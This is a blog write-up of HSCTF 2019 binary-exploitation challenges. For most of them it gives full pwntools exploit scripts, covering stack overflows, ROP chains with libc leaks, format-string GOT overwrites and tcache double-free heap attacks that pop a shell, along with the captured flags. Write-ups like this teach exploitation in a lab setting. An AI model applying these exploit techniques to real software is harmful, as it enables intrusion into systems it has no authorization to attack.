---
title: "HSCTF 2019 Writeup: Binary Exploitation"
date: 2019-06-08T10:15:05+08:00
draft: false
tags: [
  "ctf",
  "cyber-security",
  "write-up",
  "pwn",
  "hsctf"
]
description: My solves for HSCTF 2019 challenges
---

# Intro to Netcat

## Problem

Written by: Ptomerty

Hey there! This challenge is a quick introduction to netcat and how to use it. Netcat is a program that will help you "talk" with many of our challenges, especially pwn and misc. To begin, Windows users should download this file:

Mirror 1 (may have DLL errors)

Alternative download that might work

Nmap download; will get flagged by school filters

Extract the file, then open a command prompt and navigate to the directory using cd <download-directory>. From there, you can run nc misc.hsctf.com 1111 to get your first flag.

Have fun!

## Solution

```
❯ nc misc.hsctf.com 1111
Hey, here's your flag! hsctf{internet_cats}
```

flag: `hsctf{internet_cats}`

# Return to Sender

## Problem

Written by: Ptomerty

Who knew the USPS could lose a letter so many times?

`nc pwn.hsctf.com 1234`

6/3/19 7:34 AM: Updated binary, SHA-1: 104fb76c3318fb44130c4a8ee50ac1a2f52d4082 return-to-sender

[return-to-sender](/blog/2019-06-08-hsctf-writeup/Return to Sender/return-to-sender)

[return-to-sender.c](/blog/2019-06-08-hsctf-writeup/Return to Sender/return-to-sender.c)

## Solution

This is a simple buffer overflow challenge.

```
$ checksec return-to-sender
[*] '/home/node/tmp/return-to-sender'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```c
int vuln()
{
  char s; // [esp+8h] [ebp-10h]

  printf("Where are you sending your mail to today? ");
  gets(&s);
  return printf("Alright, to %s it goes!\n", &s);
}
```

As you can see, there's no stack canary and we can overflow the `s` buffer in the `vuln` function through the `gets` call. Also, there's a `win` function for us:

```c
int win()
{
  return system("/bin/sh");
}
```

Here's the exploit script:

```python
from pwn import *

sh = remote('pwn.hsctf.com', 1234)

win_addr = 0x080491B6
sh.sendlineafter('? ', 'a'*(0x10+4)+p64(win_addr))

sh.interactive()
```

```
$ python main.py
[+] Opening connection to pwn.hsctf.com on port 1234: Done
[*] Switching to interactive mode
Alright, to aaaaaaaaaaaaaaaaaaaa\xb6\x91\x0 it goes!
$ cat flag
hsctf{fedex_dont_fail_me_now}
```

flag: `hsctf{fedex_dont_fail_me_now}`

# Combo Chain Lite

## Problem

Written by: Ptomerty

Training wheels!

`nc pwn.hsctf.com 3131`

[combo-chain-lite](/blog/2019-06-08-hsctf-writeup/Combo Chain Lite/combo-chain-lite)

[combo-chain-lite.c](/blog/2019-06-08-hsctf-writeup/Combo Chain Lite/combo-chain-lite.c)

## Solution

This is an easy 64 bit ROP challenge. Our goal is to call `system` with `/bin/sh` as the first argument.

> If you are curious how to solve a 32 bit ROP challenge, take a look at [this](/blog/posts/picoctf-2018-writeup/binary-exploitation/#rop-chain).

Find the address of `/bin/sh` with [gef](https://github.com/hugsy/gef):

```
$ gdb ./combo-chain-lite
gef➤  r
...
gef➤  grep /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/home/node/tmp/combo-chain-lite'(0x402000-0x403000), permission=r--
  0x402051 - 0x402058  →   "/bin/sh"
...
```

Find the `pop rdi` gadget with [ROPgadget](https://github.com/JonathanSalwan/ROPgadget):

```
$ ROPgadget --binary ./combo-chain-lite | grep "pop rdi"
0x0000000000401273 : pop rdi ; ret
```

Exploit script:

```python
from pwn import *

context.arch='amd64'

sh = remote('pwn.hsctf.com', 3131)

pop_rdi = 0x0000000000401273
bin_sh_addr = 0x402051
system_addr = int(sh.recvline().strip().split(': ')[-1],16)

payload = 'a'*(8+8)
payload += flat(pop_rdi, bin_sh_addr)
payload += flat(system_addr)

sh.sendlineafter(': ', payload)

sh.interactive()
```

```
$ python main.py
[+] Opening connection to pwn.hsctf.com on port 3131: Done
[*] Switching to interactive mode
$ cat flag
hsctf{wheeeeeee_that_was_fun}
```

flag: `hsctf{wheeeeeee_that_was_fun}`

# Storytime

## Problem

Written by: Tux

I want a story!!!

`nc pwn.hsctf.com 3333`

[storytime](/blog/2019-06-08-hsctf-writeup/Storytime/storytime)

## Solution

Typical ROP challenge. Have to first leak libc base address and then call `system` with `/bin/sh` to get shell. Can determine the libc version using [this](https://libc.blukat.me/?q=write%3A2b0&l=libc6_2.23-0ubuntu11_amd64) from leaking the GOT entries.

```python
from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './storytime'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

if context.bits == 64:
  r = process(['ROPgadget', '--binary', BINARY])
  gadgets = r.recvall().strip().split('\n')[2:-2]
  gadgets = map(lambda x: x.split(' : '),gadgets)
  gadgets = map(lambda x: (int(x[0],16),x[1]),gadgets)
  r.close()

  pop_rdi = 0
  pop_rsi_r15 = 0
  pop_rdx = 0

  for addr, name in gadgets:
    if 'pop rdi ; ret' in name:
      pop_rdi = addr
    if 'pop rsi ; pop r15 ; ret' in name:
      pop_rsi_r15 = addr
    if 'pop rdx ; ret' in name:
      pop_rdx = addr

  def call(f, a1, a2, a3):
    out = ''
    if a1 != None:
      out += p64(pop_rdi)+p64(a1)
    if a2 != None:
      out += p64(pop_rsi_r15)+p64(a2)*2
    if a3 != None:
      if pop_rdx == 0:
        print 'RDX GADGET NOT FOUND'
        exit(-1)
      else:
        out += p64(rdx)+p64(a3)
    return out+p64(f)

def attach_gdb():
  gdb.attach(sh)

if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  sh = remote('pwn.hsctf.com', 3333)
  REMOTE = True
write_plt = 0x004004a0
write_got = 0x0000000000601018
main_addr = 0x40062e

# leak libc
payload = 'a'*(0x30+8)
payload += call(write_plt, 1, write_got, None)
payload += p64(main_addr)
sh.sendlineafter(': \n', payload)

libc_base = u64(sh.recvuntil('story')[:8])-0x0f72b0
print 'libc_base: {}'.format(hex(libc_base))

system_addr = libc_base + 0x045390
bin_sh_addr = libc_base + 0x18cd57

# system("/bin/sh") to pop shell

payload = 'a'*(0x30+8)
payload += call(system_addr, bin_sh_addr, None, None)
sh.sendlineafter(': \n', payload)

sh.interactive()
```

```
$ python main.py r
...
[*] Switching to interactive mode
$ cat flag
hsctf{th4nk7_f0r_th3_g00d_st0ry_yay-314879357}
```

flag: `hsctf{th4nk7_f0r_th3_g00d_st0ry_yay-314879357}`

# Combo Chain

## Problem

Written by: Ptomerty

I've been really into Super Smash Brothers Melee lately...

`nc pwn.hsctf.com 2345`

libc SHA-1: 238e834fc5baa8094f5db0cde465385917be4c6a libc.so.6 libc6_2.23-0ubuntu11_amd64

6/3/19 7:35 AM: Binary updated, SHA-1: 0bf0640256566d2505113f485949ec96f1cd0bb9 combo-chain

[combo-chain](/blog/2019-06-08-hsctf-writeup/Combo Chain/combo-chain)

[combo-chain.c](/blog/2019-06-08-hsctf-writeup/Combo Chain/combo-chain.c)

## Solution

This is similar to [Storytime](#storytime), but we don't have access to the `write` function. The solution is to write a format string into bss using the `gets` function and then leak libc base address using `printf` as the return address for the `main` function points to libc. After that, just call `system` with `/bin/sh` to get shell. (The [libc](https://libc.blukat.me/?q=system%3A390&l=libc6_2.23-0ubuntu11_amd64) version is determined through leaks.)

```python
from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './combo-chain'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

if context.bits == 64:
  r = process(['ROPgadget', '--binary', BINARY])
  gadgets = r.recvall().strip().split('\n')[2:-2]
  gadgets = map(lambda x: x.split(' : '),gadgets)
  gadgets = map(lambda x: (int(x[0],16),x[1]),gadgets)
  r.close()

  pop_rdi = 0
  pop_rsi_r15 = 0
  pop_rdx = 0

  for addr, name in gadgets:
    if 'pop rdi ; ret' in name:
      pop_rdi = addr
    if 'pop rsi ; pop r15 ; ret' in name:
      pop_rsi_r15 = addr
    if 'pop rdx ; ret' in name:
      pop_rdx = addr

  def call(f, a1, a2, a3):
    out = ''
    if a1 != None:
      out += p64(pop_rdi)+p64(a1)
    if a2 != None:
      out += p64(pop_rsi_r15)+p64(a2)*2
    if a3 != None:
      if pop_rdx == 0:
        print 'RDX GADGET NOT FOUND'
        exit(-1)
      else:
        out += p64(rdx)+p64(a3)
    return out+p64(f)

def attach_gdb():
  gdb.attach(sh)

if DEBUG:
  context.log_level = 'debug'

def start():
  global sh
  if len(argv) < 2:
    stdout = process.PTY
    stdin = process.PTY

    sh = process(BINARY, stdout=stdout, stdin=stdin)

    # if DEBUG:
    #   attach_gdb()

    REMOTE = False
  else:
    sh = remote('pwn.hsctf.com', 2345)
    REMOTE = True


start()
bin_sh_addr = 0x402031
gets_got = 0x0000000000404030
printf_plt = 0x401050
gets_plt = 0x401060
vuln_addr = 0x401166
format_str_addr = 0x0000000000404730

payload = 'a'*(8+8)
payload += call(gets_plt, format_str_addr, None, None)
payload += call(printf_plt, format_str_addr, None, None)
payload += p64(vuln_addr)
payload = payload.ljust(0x40, 'a')
payload += p64(gets_got)
pause()
sh.sendlineafter(': ', payload)

# fmt = ''
# for i in range(300):
#  fmt += '%p '
# sh.sendline(fmt)

sh.sendline('%6$s')

libc_base = u64(sh.recvuntil('Dude')[:6].ljust(8,'\x00'))-0x000000000006ed80
system_addr = libc_base + 0x045390

payload = 'a'*(8+8)
payload += call(system_addr, bin_sh_addr, None, None)
sh.sendlineafter(': ', payload)

sh.interactive()
sh.close()
```

```
$ python main.py r
...
`[*] Switching to interactive mode`
$ cat flag
hsctf{i_thought_konami_code_would_work_here}
```

flag: `hsctf{i_thought_konami_code_would_work_here}`

# Bit

## Problem

Written by: Arinerron

Just get the flippin' flag.

`nc pwn.hsctf.com 4444`

[bit](/blog/2019-06-08-hsctf-writeup/Bit/bit)

## Solution

The bit flip function can act as an arbitrary write and an arbitrary read. The problem is that we can only call flip four times. To bypass this, we can use one call to leak libc_base, one call to [leak stack_base](https://github.com/Naetw/CTF-pwn-tips#leak-stack-address) via the `environ` symbol in libc, and one call to change the counter to negative. After these three calls, we are able to bypass the call limit as the counter is now a large negative number.

After that, we can flip puts_got bit by bit to set it to the win address. In the end, we just have to flip the bit in counter to set it back to positive to exit the program and trigger the win function.

```python
from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './bit'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)

if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  sh = remote('pwn.hsctf.com', 4444)
  REMOTE = True

def send_input(addr, index):
  sh.sendlineafter(': ', '{:x}'.format(addr))
  sh.sendlineafter(': ', '{:x}'.format(index))
  return int(sh.recvuntil('address of the byte').strip().split('\n')[2].split(': ')[-1], 16)

def leak(addr):
  return send_input(addr, 0)^1

puts_got = 0x0804a018 
flag_addr = 0x080486a6

if REMOTE:
  # https://libc.blukat.me/?q=puts%3Aca0%2Csetvbuf%3A360&l=libc6_2.23-0ubuntu11_i386
  puts_offset = 0x05fca0
  environ_offset = 0x001b3dbc
else:
  # https://libc.blukat.me/?q=puts%3Ab40&l=libc6_2.27-3ubuntu1_i386
  puts_offset = 0x067b40
  environ_offset = 0x001d9dd8

# make counter negative
libc_base = leak(puts_got)-puts_offset
print hex(libc_base)
counter_addr = leak(libc_base+environ_offset)-0xd4
print hex(counter_addr)
send_input(counter_addr+3, 7)

# overwrite got to the win function
current_v = leak(puts_got)^1
goal = flag_addr

for i in range(4*8):
  if ((current_v >> i) & 1) != ((goal >> i) & 1):
    send_input(puts_got+(i//8), i%8)

send_input(counter_addr+3, 7)

sh.interactive()
```

flag: `hsctf{flippin_pwn_g0d}`

# Caesar's Revenge

## Problem

Written by: Ptomerty

Julius Caesar's back, and he's not happy...

`nc pwn.hsctf.com 4567`

6/3/19 7:36 AM: Binary updated, SHA-1: 42280638b188cea498e7b6c55462dbf0351056f4 caesars-revenge

[caesars-revenge](/blog/2019-06-08-hsctf-writeup/Caesars Revenge/caesars-revenge)

[caesars-revenge.c](/blog/2019-06-08-hsctf-writeup/Caesars Revenge/caesars-revenge.c)

## Solution

This is a classic format string challenge with Caesar cipher sprinkled on top. After implementing a Caesar cipher function, it turns into a plain format string attack. I broke the exploit into three stages. Stage one is to change the puts_got entry and make the `caesar` function loop. Then for stage two, we leak the libc base address from another got entry. Then lastly, change the puts_got entry to a one_gadget address and get a shell.

Here is the exploit script:

```python
from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './caesars-revenge'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  sh = remote('pwn.hsctf.com', 4567)
  REMOTE = True

def shift(input, shift=13):
  out = ''
  for c in input:
    c = ord(c)
    if c > 64 and c <= 90:
      out += chr((shift+c-65)%26+65)
    elif c > 96 and c <= 122:
      out += chr((shift+c-97)%26+97)
    else:
      out += chr(c)

  return out

def fmt_str(location, target, offset=0, padding=0x30):
  offset += padding//8
  payload = '%{}x'.format((target>>(8*0))&0xffff)
  payload += '%{}$hn'.format(offset)
  payload += '%{}x'.format((0x10000-((target>>(8*0))&0xffff))+((target>>(8*2))&0xffff))
  payload += '%{}$hn'.format(offset+1)
  payload += '%{}x'.format((0x10000-((target>>(8*2))&0xffff))+((target>>(8*4))&0xffff))
  payload += '%{}$hn'.format(offset+2)
  payload += '%{}x'.format((0x10000-((target>>(8*4))&0xffff))+((target>>(8*6))&0xffff))
  payload += '%{}$hn'.format(offset+3)

  payload = payload.ljust(padding, 'a')
  payload += p64(location)
  payload += p64(location+2)
  payload += p64(location+4)
  payload += p64(location+6)

  return payload

send = lambda payload: [sh.sendlineafter(': ', shift(payload)), sh.sendlineafter(': ', '13'), sh.recvuntil(': ')]

puts_got = 0x0000000000404018
printf_got = 0x0000000000404038
fgets_got = 0x0000000000404040
caesar_addr = 0x401196

# make it loop
payload = fmt_str(puts_got, caesar_addr, 24, 0x40)
send(payload)

# leak libc_base
payload = '%25$s'.ljust(8,' ')+p64(fgets_got)
send(payload)

libc_base = u64(sh.recv(6).ljust(8,'\x00'))-0x06dad0
print 'libc_base: '+hex(libc_base)

# one_gadget and profit
# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
win_addr = libc_base + 0x4526a
payload = fmt_str(puts_got, win_addr, 24, 0x40)
send(payload)
sh.interactive()
```

flag: `hsctf{should_have_left_%n_back_in_ancient_rome}`

# Byte

## Problem

Written by: Arinerron

Free arbitrary null write primitive, get the flag

`nc pwn.hsctf.com 6666`

Binary updated without breaking changes: 5223e3fe7827c664a5adc5e0fa6f2c0ced8abaaf byte

[byte](/blog/2019-06-08-hsctf-writeup/Byte/byte)

## Solution

The binary is made to confuse decompilers. If you look at the disassembly, you can see that there's a stack variable that is checked when the loop exits. If it's zero, the flag will be printed. We can abuse the format string vuln to leak the stack address of the variable and zero it out on the second go.

Here is the exploit code:

```python
from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './byte'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)

if DEBUG:
  context.log_level = 'debug'

def start():
  global sh
  if len(argv) < 2:
    stdout = process.PTY
    stdin = process.PTY

    sh = process(BINARY, stdout=stdout, stdin=stdin)

    if DEBUG:
      attach_gdb()

    REMOTE = False
  else:
    sh = remote('pwn.hsctf.com', 6666)
    REMOTE = True

# for i in range(10):
#   start()
#   sh.sendline('%{}$p'.format(1+i))
#   sh.interactive()
#   sh.close()

start()

sh.sendlineafter(': ', '%7$p')
target_addr = int(sh.recvuntil('is not a valid pointer').strip().split(' ')[0],16)-0x13a

sh.sendlineafter(': ', '{:x}'.format(target_addr))

sh.interactive()
```

flag: `hsctf{l0l-opt1mizati0ns_ar3-disabl3d}`

# Aria Writer

## Problem

Written by: NotDeGhost

Rob wants to write a song, but he doesn't know what to say. Help him write his way to a shell.

nc pwn.hsctf.com 2222

[aria-writer](/blog/2019-06-08-hsctf-writeup/Aria Writer/aria-writer)

[libc-2.27.zip](/blog/2019-06-08-hsctf-writeup/Aria Writer/libc-2.27.zip)

## Solution

This is a tcache heap challenge where we can allocate and free chunks. There's a double-free vulnerability. Using this, we can let `malloc` return an arbitrary address similar to [this](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c). First, I replaced exit_got with a ret gadget which allows us to bypass the free limit (this might not be necessary in the end). I achieved this by letting `malloc` return `exit_got` and writing to it. Then I did the same thing and allocated a chunk at `name` in the bss. Because it's not in the heap, after the `name` chunk is freed, it went into the small bin instead of the tcache list. Then using the hidden option, I dumped the content of the chunk leaking the libc_base address as the small bin is doubly linked. From there, I changed one got entry to point to one_gadget and got a shell.

Here is the exploit script:

```python
from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './aria-writer'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  sh = remote('pwn.hsctf.com', 2222)
  REMOTE = True

alloc = lambda size, content: [sh.sendlineafter('> ', '1'), sh.sendlineafter('> ', str(size)), sh.sendlineafter('> ', content)]
free = lambda: sh.sendlineafter('> ', '2')

name_addr = 0x6020E0
chunk_addr = name_addr + 0x10
printf_got = 0x0000000000602048
exit_got = 0x0000000000602078
chunk_size = 0x90

chunk1 = flat(0, 0x11)
chunk1 = chunk1.ljust(0x10, '\x00')
chunk2 = flat(0, chunk_size+1)
chunk2 = chunk2.ljust(chunk_size, '\x00')
chunk3 = flat(0, 0x11)
chunk3 = chunk3.ljust(0x10, '\x00')
# name = chunk1 + chunk2
name = chunk1 + chunk2 + chunk3 + flat(0, 0x11)

ret_addr = 0x00400c0c

sh.sendlineafter('> ', name)

# alloc(0x100, p64(name_addr+0x10))
# free()
# free()
# alloc(0x100, p64(name_addr+0x10))
# alloc(0x100, 'abcde')
# alloc(0x100, 'thisgoestoname')

# alloc(0x10, 'abcde')

# for i in range(8):
#   alloc(0x100, p64(name_addr+0x10))
#   free()
# alloc(0x100, p64(name_addr+0x10))
# free()


# alloc(100, p64(printf_got))
# free()
# free()
# alloc(100, p64(printf_got))
# alloc(100, 'abcde')
# alloc(100, p64(win_addr))

alloc(100, 'abcde')
# remove exit
alloc(100, p64(exit_got))
free()
free()
alloc(100, p64(exit_got))
alloc(100, 'abcde')
alloc(100, p64(ret_addr))

# change chunk to name
alloc(chunk_size-0x10, p64(chunk_addr+0x10))
free()
free()
alloc(chunk_size-0x10, p64(chunk_addr+0x10))
alloc(chunk_size-0x10, 'abcde')
alloc(chunk_size-0x10, 'thisgoestoname')
free()
sh.sendlineafter('> ', '3')
libc_base =u64(sh.recvuntil('composing an aria')[0x30:0x30+8])-0x3ebca0

# override printf

# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
win_addr = libc_base + 0x10a38c
alloc(150, p64(printf_got))
free()
free()
alloc(150, p64(printf_got))
alloc(150, 'abcde')
alloc(150, p64(win_addr))

# alloc(0x10, 'abcde')
# alloc(0x100, p64(name_addr+0x10))
# for i in range():
#   free()
# alloc(0x100, p64(name_addr+0x10))
# free()

sh.interactive()
```

flag: `hsctf{1_should_tho}`

# Aria Writer v3

## Problem

Written by NotDeGhost

After all that writing, Rob's gone blind. He still needs to finish this song though :(

`nc pwn.hsctf.com 2468`

[aria-writer-v3](/blog/2019-06-08-hsctf-writeup/Aria Writer v3/aria-writer-v3)

[libc-2.27.zip](/blog/2019-06-08-hsctf-writeup/Aria Writer v3/libc-2.27.zip)

## Solution

This is similar to the last challenge. The difference is we are now limited by the number of malloc calls instead of the number of free calls; furthermore, we no longer have a way to dump the name value completely. The first part is not too be big of an issue because our last script is nowhere close to the limit. The second part, however, does make our task harder. My solution, in the end, is to first free the smallbin chunk that is located at name and then allocate a chunk right before it and replace all the previous bytes with the ascii character `a`. This way the `printf` call will help us leak the value. After we obtain the libc base address, it's the same as last time.

Here's the exploit script:

```python
from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './aria-writer-v3'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  # if DEBUG:
  #   attach_gdb()

  REMOTE = False
else:
  sh = remote('pwn.hsctf.com', 2468)
  REMOTE = True

alloc = lambda size, content: [sh.sendlineafter('> ', '1'), sh.sendlineafter('> ', str(size)), sh.sendlineafter('> ', content)]
free = lambda: sh.sendlineafter('> ', '2')

name_addr = 0x602048
chunk_addr = name_addr + 0x8
printf_got = 0x0000000000601fb8
exit_got = 0x0000000000601fe8
puts_got = 0x0000000000601f98
chunk_size = 0x90

chunk1 = flat(0, 0x11)
chunk1 = chunk1.ljust(0x10, '\x00')
chunk2 = flat(0, chunk_size+1)
chunk2 = chunk2.ljust(chunk_size, '\x00')
chunk3 = flat(0, 0x11)
chunk3 = chunk3.ljust(0x10, '\x00')
# name = chunk1 + chunk2
name = chunk1 + chunk2 + chunk3 + flat(0, 0x11)
name = name[8:]
ret_addr = 0x00400c0c

sh.sendlineafter('> ', name)

# change chunk to name
alloc(chunk_size-0x10, p64(chunk_addr+0x10))
free()
free()
alloc(chunk_size-0x10, p64(chunk_addr+0x10))
alloc(chunk_size-0x10, 'abcde')
alloc(chunk_size-0x10, 'thisgoestoname')
free()

# remove null bytes
alloc(0x100, p64(name_addr))
free()
free()
alloc(0x100, p64(name_addr))
alloc(0x100, 'abcde')
alloc(0x100, 'a'*(8*3-1))

# get leak
libc_base =u64(sh.recvuntil('! rob needs your help composing an aria')[24:24+6].ljust(8,'\x00'))-0x3ebd20
print 'libc_base: {}'.format(hex(libc_base))

# override printf
# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

win_addr = libc_base + 0x4f322
malloc_hook = libc_base + 0x3ebc30
print 'win_addr: {}'.format(hex(win_addr))
print 'malloc_hook: {}'.format(hex(malloc_hook))
alloc(0x120, p64(malloc_hook))
free()
free()
alloc(0x120, p64(malloc_hook))
alloc(0x120, 'abcde')
alloc(0x120, p64(win_addr))

# profit
sh.sendlineafter('> ', '1')
sh.sendlineafter('> ', '100')

sh.interactive()
```

flag: `hsctf{i_wish_tho_:(_0a0d098213}`